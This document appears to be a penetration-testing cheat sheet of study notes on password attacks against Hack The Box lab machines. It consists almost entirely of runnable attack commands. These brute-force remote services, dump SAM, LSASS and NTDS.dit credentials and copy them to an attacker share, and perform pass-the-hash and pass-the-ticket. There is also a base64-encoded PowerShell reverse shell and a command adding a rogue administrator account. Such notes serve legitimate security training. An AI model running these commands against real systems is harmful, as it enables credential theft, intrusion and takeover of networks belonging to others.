# Network Services

## CrackMapExec

Can be used for WinRM, SMB, LDAP, MSSQL, and others

Installing
```
sudo apt-get -y install crackmapexec
```

Help with specific protocol
```
crackmapexec smb -h
```

Usage
```
crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
```

```
crackmapexec winrm 10.129.42.197 -u user.list -p password.list
```

## Evil-WinRM

Used for WinRM specifically

Installing
```
sudo gem install evil-winrm
```

Usage
```
evil-winrm -i <target-IP> -u <username> -p <password>
```

```
evil-winrm -i 10.129.42.197 -u user -p password
```

If successful, it uses a powershell connection

## Hydra - SSH

Used to brute force SSH

```
hydra -L user.list -P password.list ssh://10.129.42.197
```

## Hydra - RDP

Used to brute force RDP

```
hydra -L user.list -P password.list rdp://10.129.42.197
```


## Hydra - SMB

Used to brute force SMB

```
hydra -L user.list -P password.list smb://10.129.42.197
```

If you get the following error:
```
[ERROR] invalid reply from target smb://10.129.42.197:445/
```
This is because we most likely have an outdated version of THC-Hydra that cannot handle SMBv3 replies. To work around this problem, we can manually update and recompile hydra or use another very powerful tool, the Metasploit framework.

```
msfconsole -q

msf6 > use auxiliary/scanner/smb/smb_login
msf6 auxiliary(scanner/smb/smb_login) > options 

Module options (auxiliary/scanner/smb/smb_login):

...

msf6 auxiliary(scanner/smb/smb_login) > set user_file user.list

user_file => user.list


msf6 auxiliary(scanner/smb/smb_login) > set pass_file password.list

pass_file => password.list


msf6 auxiliary(scanner/smb/smb_login) > set rhosts 10.129.42.197

rhosts => 10.129.42.197

msf6 auxiliary(scanner/smb/smb_login) > run

[+] 10.129.42.197:445     - 10.129.42.197:445 - Success: '.\user:password'
[*] 10.129.42.197:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Then use CrackMapExec to view shares
```
crackmapexec smb 10.129.42.197 -u "user" -p "password" --shares
```

And use SMBClient to view contents
```
smbclient -U user \\\\10.129.42.197\\SHARENAME
```


## Hydra - POST Request

```
hydra -l user -P /usr/share/wordlists/rockyou.txt 8.8.8.8 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
```

## Hydra - HTTP Auth

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt -f 8.8.8.8 http-get
```

# Password Mutations

## Hashcat

Generate new wordlist adding mutations to the existing wordlist
```
cat custom.rule

:
c
so0
c so0
sa@
c sa@
c sa@ so0
$!
$! c
$! so0
$! sa@
$! c so0
$! c sa@
$! so0 sa@
$! c so0 sa@
```

```
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
```

View existing rule files
```
ls /usr/share/hashcat/rules/
```

## CeWL

Can be used to crawl a site and generate a wordlist for possible passwords

```
cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
```



# Windows Local

## SAM

### Copying SAM Registry Hives

| Registry Hive | Description                                                                                                                                                |
| ------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------- |
| hklm\sam      | Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext. |
| hklm\system   | Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.                              |
| hklm\security | Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.                                        |

### Saving Copies

```
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```

### Sharing with attack box

Create SMB Share
```
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/
```

Move files to share
```
move sam.save \\10.10.15.16\CompData
move security.save \\10.10.15.16\CompData
move system.save \\10.10.15.16\CompData
```

### Dumping Hashes

Locating secretsdump
```
locate secretsdump 
```

Running secretsdump.py
```
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

### Cracking with Hashcat

Add nthashes (second hash) to .txt file
```
sudo vim hashestocrack.txt

64f12cddaa88057e06a81b54e73b949b
31d6cfe0d16ae931b73c59d7e0c089c0
6f8c3f4d3869a10f3b4f0522f537fd33
184ecdda8cf1dd238d438c4aea4d560d
f7eb9c06fafaa23c4bcf22ba6781c1e2
```

Running hashcat
```
sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```

### Dumping LSA Secrets

```
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```

### Dumping SAM Remotely

```
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```

## LSASS

### Creating copy of LSASS Memory

Open Task Manager > Select the Processes tab > Find & right click the Local Security Authority Process > Select Create dump file

C:\\Users\\loggedonusersdirectory\\AppData\\Local\\Temp\\lsass.DMP

_OR_

find lsass.exe and its process ID in the PID field
```
tasklist /svc
```

In powershell
```
Get-Process lsass
```

Create Dump
```
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
```

### Extracting data from dump

```
pypykatz lsa minidump /home/peter/Documents/lsass.dmp 
```

### Cracking the hash

```
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```

## AD & NTDS.dit

[Username Anarchy](https://github.com/urbanadventurer/username-anarchy) to generate a list of possible usernames

### Launching attack with crackmapexec
```
crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
```

### Capturing NTDS.dit

NTDS.dit file is stored at %systemroot%/ntds on the domain controllers in a forest.

Connecting to DC
```
evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'
```

Checking local group membership
```
net localgroup
```

To make a copy of the NTDS.dit file, we need local admin (Administrators group) or Domain Admin (Domain Admins group) (or equivalent) rights. 

Checking account privileges including Domain
```
net user bwilliamson
```

Create shadow copy of C:
```
vssadmin CREATE SHADOW /For=C:
```

Copy NTDS.dit from volume shadow copy to another location on the drive
```
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```

create an SMB share on our attack host using the method mentioned in [[#Sharing with attack box]]

Copy to attack host
```
cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData 
```

*___OR__*

Use cme to capture NTDS.dit
```
crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
```

### Cracking with Hashcat

```
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```

### Pass the Hash with Evil-WinRM

```
evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"
```


## Credential Hunting

Use Windows Search to search for password or username to find files or applications

[LaZagne](https://github.com/AlessandroZ/LaZagne) to automate searching

```
start lazagne.exe all
```

Using findstr
```
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

Here are some other places we should keep in mind when credential hunting:

    Passwords in Group Policy in the SYSVOL share
    Passwords in scripts in the SYSVOL share
    Password in scripts on IT shares
    Passwords in web.config files on dev machines and IT shares
    unattend.xml
    Passwords in the AD user or computer description fields
    KeePass databases --> pull hash, crack and get loads of access.
    Found on user systems and shares
    Files such as pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, Sharepoint


# Linux Local

## Credential Hunting

### Finding Configuration Files

```
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```

Modify it to output specific lines for user, pass, or password
```
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
```

### Finding Database Files

```
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
```

### Finding TXT Files and Files With No Extension

```
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```

### Finding Script Files

```
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```

### Finding Cronjobs

```
cat /etc/crontab
```

```
ls -la /etc/cron.*/
```

### Finding SSH Keys

```
grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"
```

```
grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"
```

### Checking Bash History

```
tail -n5 /home/*/.bash*
```

### Looking in Log Files

```
for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
```

### Checking System Memory

```
sudo python3 mimipenguin.py
sudo bash mimipenguin.sh
```

laZagne.py
```
sudo python2.7 laZagne.py all
```

### Firefox

```
ls -l .mozilla/firefox/ | grep default
```

```
cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
```

```
python3.9 firefox_decrypt.py
```

laZagne.py
```
python3 laZagne.py browsers
```

## Passwd/Shadow/Opasswd

```
$<type>$<salt>$<hashed>
```

Algorithm Types

    `$1$ – MD5`
    $2a$ – Blowfish
    $2y$ – Eksblowfish
    $5$ – SHA-256
    $6$ – SHA-512

The PAM library (pam_unix.so) can prevent reusing old passwords. The file where old passwords are stored is the /etc/security/opasswd. Administrator/root permissions are also required to read the file if the permissions for this file have not been changed manually.

### Cracking Credentials

```
sudo cp /etc/passwd /tmp/passwd.bak
sudo cp /etc/shadow /tmp/shadow.bak 
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
```

```
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
```

Cracking MD5 hashes
```
hashcat -m 500 -a 0 md5-hashes.list rockyou.txt
```

TUqr7QfLTLhruhVbCP

# Pass The Hash

## Mimikatz


    /user - The user name we want to impersonate.
    /rc4 or /NTLM - NTLM hash of the user's password.
    /domain - Domain the user to impersonate belongs to. In the case of a local user account, we can use the computer name, localhost, or a dot (.).
    /run - The program we want to run with the user's context (if not specified, it will launch cmd.exe).

```
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```

## Invoke-TheHash


    Target - Hostname or IP address of the target.
    Username - Username to use for authentication.
    Domain - Domain to use for authentication. This parameter is unnecessary with local accounts or when using the @domain after the username.
    Hash - NTLM password hash for authentication. This function will accept either LM:NTLM or NTLM format.
    Command - Command to execute on the target. If a command is not specified, the function will check to see if the username and hash have access to WMI on the target.

```
cd C:\tools\Invoke-TheHash\
Import-Module .\Invoke-TheHash.psd1
Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```

### Reverse Shell

Generate powershell base64 from [revshells](https://www.revshells.com/)

```
Import-Module .\Invoke-TheHash.psd1
Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwAzACIALAA4ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
```

## Impacket PsExec Linux

```
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```

Can also use the following:
- [wmiexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)
- [atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py)
- [smbexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py)

## CrackMapExec Linux

Attempts to access machines across the entire network rather than one specific machine

```
crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
```

If we want to perform the same actions but attempt to authenticate to each host in a subnet using the local administrator password hash, we could add --local-auth to our command. This method is helpful if we obtain a local administrator hash by dumping the local SAM database on one host and want to check how many (if any) other hosts we can access due to local admin password re-use. If we see Pwn3d!, it means that the user is a local administrator on the target computer. We can use the option -x to execute commands. It is common to see password reuse against many hosts in the same subnet. Organizations will often use gold images with the same local admin password or set this password the same across multiple hosts for ease of administration. If we run into this issue on a real-world engagement, a great recommendation for the customer is to implement the Local Administrator Password Solution (LAPS), which randomizes the local administrator password and can be configured to have it rotate on a fixed interval.

### Command Execution

```
smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
```

## Evil-winrm Linux

```
evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```

## RDP Linux

### Enable Restricted Admin Mode

If the above command fails you may need to enable restricted admin mode to allow admins to log in via RDP

```
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

### Attack RDP

```
xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
```

```
Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username david -Hash c39f2beb3d2ec06a62cb887fb391dee0 -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```



# Pass The Ticket Windows

## Mimikatz

### Export tickets

```
mimikatz.exe
privilege::debug
sekurlsa::tickets /export
exit
dir *.kirbi
```

> Note: At the time of writing, using Mimikatz version 2.2.0 20220919, if we run "sekurlsa::ekeys" it presents all hashes as des_cbc_md4 on some Windows 10 versions. Exported tickets (sekurlsa::tickets /export) do not work correctly due to the wrong encryption. It is possible to use these hashes to generate new tickets or use Rubeus to export tickets in base64 format.


## Rubeus

### Export tickets

```
Rubeus.exe dump /nowrap
```

## Pass the Key or OverPass the Hash

### Mimikatz - Extract Kerberos Keys

```
mimikatz.exe
privilege::debug
sekurlsa::ekeys
```

### Mimikatz - Pass the Key or OverPass the Hash

```
mimikatz.exe
privilege::debug
sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
```

### Rubeus - Pass the Key or OverPass the Hash

```
Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
```

> Note: Mimikatz requires administrative rights to perform the Pass the Key/OverPass the Hash attacks, while Rubeus doesn't.

> Note: Modern Windows domains (functional level 2008 and above) use AES encryption by default in normal Kerberos exchanges. If we use a rc4_hmac (NTLM) hash in a Kerberos exchange instead of an aes256_cts_hmac_sha1 (or aes128) key, it may be detected as an "encryption downgrade." 

## Pass the Ticket

### Rubeus

```
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
```

Using kirbi file from mimikatz:
```
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
```

We can also use the base64 output from Rubeus or convert a .kirbi to base64 to perform the Pass the Ticket attack. We can use PowerShell to convert a .kirbi to base64.

```
[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
```

Using Base64:
```
Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/<SNIP>
```

### Mimikatz

```
mimikatz.exe 
privilege::debug
kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
exit
dir \\DC01.inlanefreight.htb\c$
```

> Note: Instead of opening mimikatz.exe with cmd.exe and exiting to get the ticket into the current command prompt, we can use the Mimikatz module misc to launch a new command prompt window with the imported ticket using the misc::cmd command.

## Powershell Remoting

### Mimikatz - Pass the Ticket for Lateral Movement

```
mimikatz.exe
privilege::debug
kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
exit
powershell
Enter-PSSession -ComputerName DC01
whoami
hostname
```

### Rubeus - Pass the Ticket for Lateral Movement

```
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```

```
Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
powershell
Enter-PSSession -ComputerName DC01
whoami
hostname
```



# Pass The Ticket Linux
## Kerberos on Linux

Windows and Linux use the same process to request a Ticket Granting Ticket (TGT) and Service Ticket (TGS). However, how they store the ticket information may vary depending on the Linux distribution and implementation.

In most cases, Linux machines store Kerberos tickets as ccache files in the /tmp directory. By default, the location of the Kerberos ticket is stored in the environment variable KRB5CCNAME. This variable can identify if Kerberos tickets are being used or if the default location for storing Kerberos tickets is changed. These ccache files are protected by reading and write permissions, but a user with elevated privileges or root privileges could easily gain access to these tickets.

Another everyday use of Kerberos in Linux is with keytab files. A keytab is a file containing pairs of Kerberos principals and encrypted keys (which are derived from the Kerberos password). You can use a keytab file to authenticate to various remote systems using Kerberos without entering a password. However, when you change your password, you must recreate all your keytab files.

Keytab files commonly allow scripts to authenticate automatically using Kerberos without requiring human interaction or access to a password stored in a plain text file. For example, a script can use a keytab file to access files stored in the Windows share folder.

> Note: Any computer that has a Kerberos client installed can create keytab files. Keytab files can be created on one computer and copied for use on other computers because they are not restricted to the systems on which they were initially created.

## Linux Auth via Port Forward

```
ssh david@inlanefreight.htb@10.129.204.23 -p 2222
```

## Identifying Linux and Active Directory Integration

```
realm list
```

## PS - Check if Linux Machine is Domain Joined

```
ps -ef | grep -i "winbind\|sssd"
```

## Finding Keytab Files

### Using Find to Search for Files with Keytab in the Name

```
find / -name *keytab* -ls 2>/dev/null
```

> Note: To use a keytab file, we must have read and write (rw) privileges on the file.

### Identifying Keytab Files in Cronjobs

```
crontab -l
```

### Example Crontab Script

```
cat /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
#!/bin/bash

kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt
smbclient //dc01.inlanefreight.htb/svc_workstations -c 'ls'  -k -no-pass > /home/carlos@inlanefreight.htb/script-test-results.txt
```

## Finding ccache Files

### Reviewing Environment Variables for ccache Files.

```
env | grep -i krb5
```

### Searching for ccache Files in /tmp

```
ls -la /tmp
```

## Abusing KeyTab Files

### Listing keytab File Information

```
klist -k -t 
```

> Note: kinit is case-sensitive, so be sure to use the name of the principal as shown in klist. In this case, the username is lowercase, and the domain name is uppercase.

### Impersonating a User with a keytab

```
klist
kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
klist
```

### Connecting to SMB Share as Carlos

```
smbclient //dc01/carlos -k -c ls
```

## Keytab Extract

### Extracting Keytab Hashes with KeyTabExtract

```
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 
```

### Log in as Carlos

```
su - carlos@inlanefreight.htb
klist
```

## Abusing Keytab ccache

### Privilege Escalation to Root

```
ssh svc_workstations@inlanefreight.htb@10.129.204.23 -p 2222
```

```
sudo -l
sudo su
whoami
```

### Looking for ccache Files

```
ls -la /tmp
```

### Identifying Group Membership with the id Command

```
id julio@inlanefreight.htb
```

### Importing the ccache File into our Current Session

```
klist
cp /tmp/krb5cc_647401106_I8I133 .
export KRB5CCNAME=/root/krb5cc_647401106_I8I133
klist
smbclient //dc01/C$ -k -c ls -no-pass
```

## Using Linux Attack Tools with Kerberos

### Host File Modified

```
cat /etc/hosts

# Host addresses

172.16.1.10 inlanefreight.htb   inlanefreight   dc01.inlanefreight.htb  dc01
172.16.1.5  ms01.inlanefreight.htb  ms01
```

### Proxychains Configuration File

```
cat /etc/proxychains.conf

<SNIP>

[ProxyList]
socks5 127.0.0.1 1080
```

### Download Chisel to our Attack Host

```
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
gzip -d chisel_1.7.7_linux_amd64.gz
mv chisel_* chisel && chmod +x ./chisel
sudo ./chisel server --reverse 
```

### Connect to MS01 with xfreerdp

```
xfreerdp /v:10.129.204.23 /u:david /d:inlanefreight.htb /p:Password2 /dynamic-resolution
```

### Execute chisel from MS01

```
c:\tools\chisel.exe client 10.10.14.33:8080 R:socks
```

### Setting the KRB5CCNAME Environment Variable

```
export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
```

## Impacket

### Using Impacket with proxychains and Kerberos Authentication

```
proxychains impacket-wmiexec dc01 -k
```

## Evil-Winrm

### Installing Kerberos Authentication Package

```
sudo apt-get install krb5-user -y
```

### Kerberos Configuration File for INLANEFREIGHT.HTB

```
cat /etc/krb5.conf
```

### Using Evil-WinRM with Kerberos

```
proxychains evil-winrm -i dc01 -r inlanefreight.htb
```

## Miscellaneous

### Impacket Ticket Converter

```
impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
```

### Importing Converted Ticket into Windows Session with Rubeus

```
C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
```

```
dir \\dc01\julio
```

## Linikatz

### Linikatz Download and Execution

```
wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
/opt/linikatz.sh
```

# Protected Files

## Hunting for Encoded Files

[https://fileinfo.com/filetypes/encoded](https://fileinfo.com/filetypes/encoded) for a list of possible encoded file types

```
for ext in $(echo ".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```

## Hunting for SSH Keys

```
grep -rnw "PRIVATE KEY" /* 2>/dev/null | grep ":1"
```

## Encrypted SSH Keys

```
cat /home/cry0l1t3/.ssh/SSH.private
```

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2109D25CC91F8DBFCEB0F7589066B2CC

8Uboy0afrTahejVGmB7kgvxkqJLOczb1I0/hEzPU1leCqhCKBlxYldM2s65jhflD
4/OH4ENhU7qpJ62KlrnZhFX8UwYBmebNDvG12oE7i21hB/9UqZmmHktjD3+OYTsD
...SNIP...
```

## Cracking with John

### John Hashing Scripts

```
locate *2john*
```

```
ssh2john.py SSH.private > ssh.hash
```

### Cracking SSH Keys

```
john --wordlist=rockyou.txt ssh.hash
```

```
john ssh.hash --show
```

### Cracking Documents

```
office2john.py Protected.docx > protected-docx.hash
cat protected-docx.hash
```

```
john --wordlist=rockyou.txt protected-docx.hash
john protected-docx.hash --show
```

### Cracking PDFs

```
pdf2john.py PDF.pdf > pdf.hash
cat pdf.hash 
```

```
john --wordlist=rockyou.txt pdf.hash
john pdf.hash --show
```

# Protected Archives

An extensive list of archive types can be found on [FileInfo.com](https://fileinfo.com/filetypes/compressed).

## Download All File Extensions

```
curl -s https://fileinfo.com/filetypes/compressed | html2text | awk '{print tolower($1)}' | grep "\." | tee -a compressed_ext.txt
```

## Cracking Archives

### Cracking ZIP

#### Using zip2john

```
zip2john ZIP.zip > zip.hash
cat zip.hash
```

#### Cracking the Hash with John

```
john --wordlist=rockyou.txt zip.hash
john zip.hash --show
```

## Cracking OpenSSL Encrypted Archives

Seeing if it's SSL encrypted
```
file GZIP.gzip 

GZIP.gzip: openssl enc'd data with salted password
```

The safest choice for success is to use the openssl tool in a for-loop that tries to extract the files from the archive directly if the password is guessed correctly.

### Using a for-loop to Display Extracted Contents

```
for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null| tar xz;done
```

Listing the Contents of the Cracked Archive
```
ls

customers.csv  GZIP.gzip  rockyou.txt
```

## Cracking BitLocker Encrypted Drives

If the password or PIN for BitLocker is forgotten, we can use the recovery key to decrypt the partition or drive. The recovery key is a 48-digit string of numbers generated during BitLocker setup that also can be brute-forced.

We can use a script called bitlocker2john to extract the hash we need to crack. Four different hashes will be extracted, which can be used with different Hashcat hash modes. For our example, we will work with the first one, which refers to the BitLocker password.

Once we have cracked the password, we will be able to open the encrypted drives. The easiest way to mount a BitLocker encrypted virtual drive is to transfer it to a Windows system and mount it. To do this, we only have to double-click on the virtual drive. Since it is password protected, Windows will show us an error. After mounting, we can again double-click BitLocker to prompt us for the password.
### Using bitlocker2john

```
bitlocker2john -i Backup.vhd > backup.hashes
grep "bitlocker\$0" backup.hashes > backup.hash
cat backup.hash
```

### Using hashcat to Crack backup.hash

```
hashcat -m 22100 backup.hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt -o backup.cracked
cat backup.cracked 
```

